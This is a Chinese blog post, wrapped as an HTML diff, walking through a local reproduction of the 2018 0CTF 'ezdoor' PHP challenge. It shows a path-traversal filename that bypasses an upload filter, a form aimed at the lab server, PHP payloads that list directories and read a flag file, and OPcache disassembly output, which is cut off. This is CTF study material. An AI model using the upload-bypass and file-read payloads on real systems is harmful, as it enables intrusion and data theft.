@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="写在前面之前在做0ctf的时候就看了这一道php代码审计题目，当时没做出来，好在github上有源码，决定在服务器下搭建一下环境过一遍这道题，顺便学习学习有关php的一些知识。 ​  环境搭建我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。启动docker1service docker start 将题目源码拉到本地，使用git clone命令1git c">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018 0ctf ezdoor题目复现">
+<meta property="og:url" content="elssm.github.io/2018/05/04/2018-0ctf-ezdoor复现/index.html">
+<meta property="og:site_name" content="ELSSM">
+<meta property="og:description" content="写在前面之前在做0ctf的时候就看了这一道php代码审计题目，当时没做出来，好在github上有源码，决定在服务器下搭建一下环境过一遍这道题，顺便学习学习有关php的一些知识。 ​  环境搭建我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。启动docker1service docker start 将题目源码拉到本地，使用git clone命令1git c">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="/04/2018-0ctf-ezdoor复现/1.png">
+<meta property="og:image" content="/04/2018-0ctf-ezdoor复现/2.png">
+<meta property="og:updated_time" content="2018-05-07T12:19:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018 0ctf ezdoor题目复现">
+<meta name="twitter:description" content="写在前面之前在做0ctf的时候就看了这一道php代码审计题目，当时没做出来，好在github上有源码，决定在服务器下搭建一下环境过一遍这道题，顺便学习学习有关php的一些知识。 ​  环境搭建我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。启动docker1service docker start 将题目源码拉到本地，使用git clone命令1git c">
+<meta name="twitter:image" content="/04/2018-0ctf-ezdoor复现/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="elssm.github.io/2018/05/04/2018-0ctf-ezdoor复现/">
+
+
+
+
+
+  <title>2018 0ctf ezdoor题目复现 | ELSSM</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ELSSM</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">安全小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="elssm.github.io/2018/05/04/2018-0ctf-ezdoor复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Caoyifan">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ELSSM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018 0ctf ezdoor题目复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-04T16:06:27+08:00">
+                2018-05-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>之前在做0ctf的时候就看了这一道php代码审计题目，当时没做出来，好在github上有源码，决定在服务器下搭建一下环境过一遍这道题，顺便学习学习有关php的一些知识。</p>
+<p>​</p>
+</li>
+<li><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h5 id="我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。"><a href="#我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。" class="headerlink" title="我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。"></a>我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。</h5><h5 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
+<h5 id="将题目源码拉到本地，使用git-clone命令"><a href="#将题目源码拉到本地，使用git-clone命令" class="headerlink" title="将题目源码拉到本地，使用git clone命令"></a>将题目源码拉到本地，使用git clone命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/LyleMi/My-CTF-Challenges.git</span><br></pre></td></tr></table></figure>
+<h5 id="修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹"><a href="#修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹" class="headerlink" title="修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹"></a>修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN mkdir /var/www/html/sandbox/</span><br></pre></td></tr></table></figure>
+<h5 id="进入到source文件夹创建镜像"><a href="#进入到source文件夹创建镜像" class="headerlink" title="进入到source文件夹创建镜像"></a>进入到source文件夹创建镜像</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t 0ctf-ezdoor .</span><br></pre></td></tr></table></figure>
+<h5 id="启动环境，这里的8585端口可以设置为任意一个未被占用的端口"><a href="#启动环境，这里的8585端口可以设置为任意一个未被占用的端口" class="headerlink" title="启动环境，这里的8585端口可以设置为任意一个未被占用的端口"></a>启动环境，这里的8585端口可以设置为任意一个未被占用的端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit -p 8585:80 --name 0ctf-ezdoor 0ctf-ezdoor</span><br></pre></td></tr></table></figure>
+<h5 id="之后访问http-ip-8585即可"><a href="#之后访问http-ip-8585即可" class="headerlink" title="之后访问http://ip:8585即可"></a>之后访问<a href="http://ip:8585即可" target="_blank" rel="noopener">http://ip:8585即可</a></h5></li>
+</ul>
+<ul>
+<li><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir . <span class="string">"index.php"</span>))&#123;</span><br><span class="line">  touch($dir . <span class="string">"index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">    unlink($dir);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">foreach</span> (scandir($dir) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($file, [<span class="string">"."</span>, <span class="string">".."</span>])) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($dir . $file);</span><br><span class="line">  &#125;</span><br><span class="line">  rmdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'phpinfo'</span>:</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"phpinfo.txt"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'reset'</span>:</span><br><span class="line">    clear($dir);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'time'</span>:</span><br><span class="line">    <span class="keyword">echo</span> time();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"name"</span>]) || !<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = $dir . $_GET[<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/[^a-zA-Z0-9.\/]/"</span>, $name) ||</span><br><span class="line">      stristr(pathinfo($name)[<span class="string">"extension"</span>], <span class="string">"h"</span>)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $name);</span><br><span class="line">    $size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (scandir($dir) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">      <span class="keyword">if</span> (in_array($file, [<span class="string">"."</span>, <span class="string">".."</span>])) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      $size += filesize($dir . $file);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($size &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    ini_set(<span class="string">"open_basedir"</span>, <span class="string">"/var/www/html/$dir:/var/www/html/flag"</span>);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先会根据每个人的ip地址生成一个sandbox文件夹，并在sandbox文件夹下生成一个index.php文件。switch case下有很多方式，注意到case ‘upload’看到有文件上传，主要代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[^a-zA-Z0-9.\/]/"</span>, $name) ||</span><br><span class="line">      stristr(pathinfo($name)[<span class="string">"extension"</span>], <span class="string">"h"</span>)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $name);</span><br></pre></td></tr></table></figure>
+<p>我们先来看preg_match中的正则表达式，在[ ]里以^开头，说明匹配的是^后面未包含的字符串，因此这个preg_match在这里并没有太大作用。不过正则表达式还是得好好看看，给大家分享一个学习正则的链接</p>
+<p><a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">http://tool.oschina.net/uploads/apidocs/jquery/regexp.html</a></p>
+<p>后面的stristr(pathinfo)是用来判断以“.”隔断后的字符串中是否含有“h”字符，在这里pathinfo是以字符串中最后一个“.”来进行隔断。</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=<span class="string">"index.php.exe"</span>;</span><br><span class="line"><span class="keyword">echo</span>(pathinfo($name)[<span class="string">"extension"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出为exe,因此我们可以在upload处进行上传绕过</p>
+</li>
+</ul>
+<ul>
+<li><h3 id="利用”-”绕过上传检测"><a href="#利用”-”绕过上传检测" class="headerlink" title="利用”/.”绕过上传检测"></a>利用”/.”绕过上传检测</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> $name = <span class="string">"index.php/."</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="string">"/[^a-zA-Z0-9.\/]/"</span>, $name) ||</span><br><span class="line">    stristr(pathinfo($name)[<span class="string">"extension"</span>], <span class="string">"h"</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br></pre></td></tr></table></figure>
+<p>此时输出为false，虽然现在我们可以绕过上传，但是无法进行覆盖。因此我们需要重新构造文件名实现上传覆盖。</p>
+</li>
+<li><h3 id="利用”test-index-php-”上传覆盖"><a href="#利用”test-index-php-”上传覆盖" class="headerlink" title="利用”test/../index.php/.”上传覆盖"></a>利用”test/../index.php/.”上传覆盖</h3><p>构造form表单</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.1.188:8585/index.php?action=upload&amp;name=test/../index.php/."</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本地构造index.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"666"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传之后查看<a href="http://192.168.1.188/index.php?action=shell" target="_blank" rel="noopener">http://192.168.1.188/index.php?action=shell</a></p>
+<p>看到页面输出“666”，发现成功覆盖 </p>
+<p>获取flag下文件，构造index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    var_dump(scandir(<span class="string">'/var/www/html/'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传后查看<a href="http://192.168.1.188/index.php?action=shell" target="_blank" rel="noopener">http://192.168.1.188/index.php?action=shell</a></p>
+<p>得到以下信息</p>
+<p><img src="/04/2018-0ctf-ezdoor复现/1.png" alt></p>
+<p>获取flag下的文件</p>
+<p>通过构造index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    print_r(file_get_contents(<span class="string">'/var/www/html/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad'</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到flag.php.ini,输出信息如下</p>
+<p><img src="/04/2018-0ctf-ezdoor复现/2.png" alt></p>
+<p>因为OPcache文件是以”OPcache.”开头的，但是发现上面输出信息中opcache后缺少”.”，因此将上述信息保存为本地文件，并命名为flag.php.ini，利用winhex对文件进行修复</p>
+</li>
+<li><h3 id="opcode反编译"><a href="#opcode反编译" class="headerlink" title="opcode反编译"></a>opcode反编译</h3><p>工具链接</p>
+<p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p>
+<p>安装库依赖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install construct==2.8.22</span><br><span class="line">pip install treelib</span><br><span class="line">pip install termcolor</span><br></pre></td></tr></table></figure>
+<p>反编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">./opcache_disassembler.py -c -a64 flag.php.bin</span><br></pre></td></tr></table></figure>
+<p>反编译后的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">function encrypt() &#123;</span><br><span class="line">  #0 !0 = RECV(None, None);</span><br><span class="line">  #1 !0 = RECV(None, None);</span><br><span class="line">  #2 DO_FCALL_BY_NAME(None, &apos;mt_srand&apos;);</span><br><span class="line">  #3 SEND_VAL(1337, None);</span><br><span class="line">  #4 (129)?(None, None);</span><br><span class="line">  #5 ASSIGN(!0, &apos;&apos;);</span><br><span class="line">  #6 (121)?(!0, None);</span><br><span class="line">  #7 ASSIGN(None, None);</span><br><span class="line">  #8 (121)?(!0, None);</span><br><span class="line">  #9 ASSIGN(None, None);</span><br><span class="line">  #10 ASSIGN(None, 0);</span><br><span class="line">  #11 JMP(-&gt;-24, None);</span><br><span class="line">  #12 DO_FCALL_BY_NAME(None, &apos;chr&apos;);</span><br><span class="line">  #13 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</span><br><span class="line">  #14 FETCH_DIM_R(!0, None);</span><br><span class="line">  #15 (117)?(None, None);</span><br><span class="line">  #16 (129)?(None, None);</span><br><span class="line">  #17 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</span><br><span class="line">  #18 MOD(None, None);</span><br><span class="line">  #19 FETCH_DIM_R(!0, None);</span><br><span class="line">  #20 (117)?(None, None);</span><br><span class="line">  #21 (129)?(None, None);</span><br><span class="line">  #22 BW_XOR(None, None);</span><br><span class="line">  #23 DO_FCALL_BY_NAME(None, &apos;mt_rand&apos;);</span><br><span class="line">  #24 SEND_VAL(0, None);</span><br><span class="line">  #25 SEND_VAL(255, None);</span><br><span class="line">  #26 (129)?(None, None);</span><br><span class="line">  #27 BW_XOR(None, None);</span><br><span class="line">  #28 SEND_VAL(None, None);</span><br><span class="line">  #29 (129)?(None, None);</span><br><span class="line">  #30 ASSIGN_CONCAT(!0, None);</span><br><span class="line">  #31 PRE_INC(None, None);</span><br><span class="line">  #32 IS_SMALLER(None, None);</span><br><span class="line">  #33 JMPNZ(None, -&gt;134217662);</span><br><span class="line">  #34 DO_FCALL_BY_NAME(None, &apos;encode&apos;);</span><br><span class="line">  #35 (117)?(!0, None);</span><br><span class="line">  #36 (130)?(None, None);</span><br><span class="line">  #37 RETURN(None, None);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function encode() &#123;</span><br><span class="line">  #0 RECV(None, None);</span><br><span class="line">  #1 ASSIGN(None, &apos;&apos;);</span><br><span class="line">  #2 ASSIGN(None, 0);</span><br><span class="line">  #3 JMP(-&gt;-81, None);</span><br><span class="line">  #4 DO_FCALL_BY_NAME(None, &apos;dechex&apos;);</span><br><span class="line">  #5 DO_FCALL_BY_NAME(None, &apos;ord&apos;);</span><br><span class="line">  #6 FETCH_DIM_R(None, None);</span><br><span class="line">  #7 (117)?(None, None);</span><br><span class="line">  #8 (129)?(None, None);</span><br><span class="line">  #9 (117)?(None, None);</span><br><span class="line">  #10 (129)?(None, None);</span><br><span class="line">  #11 ASSIGN(None, None);</span><br><span class="line">  #12 (121)?(None, None);</span><br><span class="line">  #13 IS_EQUAL(None, 1);</span><br><span class="line">  #14 JMPZ(None, -&gt;-94);</span><br><span class="line">  #15 CONCAT(&apos;0&apos;, None);</span><br><span class="line">  #16 ASSIGN_CONCAT(None, None);</span><br><span class="line">  #17 JMP(-&gt;-96, None);</span><br><span class="line">  #18 ASSIGN_CONCAT(None, None);</span><br><span class="line">  #19 PRE_INC(None, None);</span><br><span class="line">  #20 (121)?(None, None);</span><br><span class="line">  #21 IS_SMALLER(None, None);</span><br><span class="line">  #22 JMPNZ(None, -&gt;134217612);</span><br><span class="line">  #23 RETURN(None, None);</span><br><span class="line"></span><br><span 